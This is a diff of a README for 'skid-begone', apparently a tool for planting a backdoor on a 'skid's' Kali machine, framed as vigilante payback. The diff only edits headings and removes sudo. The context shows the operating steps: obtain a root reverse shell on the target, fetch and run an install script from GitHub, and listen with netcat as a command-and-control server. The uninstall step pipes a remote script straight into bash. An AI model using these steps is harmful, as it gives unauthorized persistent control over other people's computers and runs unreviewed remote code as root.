@@ -26,7 +26,7 @@ One day they will learn the hard way...
 - you must obtain a root reverse-shell
 - skid must run Kali (other distros *might* work too)
 
-### Actually running the script
+### Actually running the script (run as root)
 
 ```sh
 curl -sSL https://raw.githubusercontent.com/GermanBread/skid-begone/master/install.sh > /tmp/install.sh
@@ -44,14 +44,14 @@ By default the backdoor will start alongside other system services. If the servi
 
 By "command and control server" I mean you, the one reading this right now, listening on the port you specified during install of the backdoor, using netcat (here's the command: `nc -vlp <your port>`).
 
-### Uninstalling
+### Uninstalling (run as root)
 
 ```sh
-curl -sSL https://raw.githubusercontent.com/GermanBread/skid-begone/master/undo.sh | sudo bash
+curl -sSL https://raw.githubusercontent.com/GermanBread/skid-begone/master/undo.sh | bash
 ```
 
 alternatively with wget:
 
 ```sh
-wget -qq https://raw.githubusercontent.com/GermanBread/skid-begone/master/undo.sh -O - | sudo bash
+wget -qq https://raw.githubusercontent.com/GermanBread/skid-begone/master/undo.sh -O - | bash
 ```
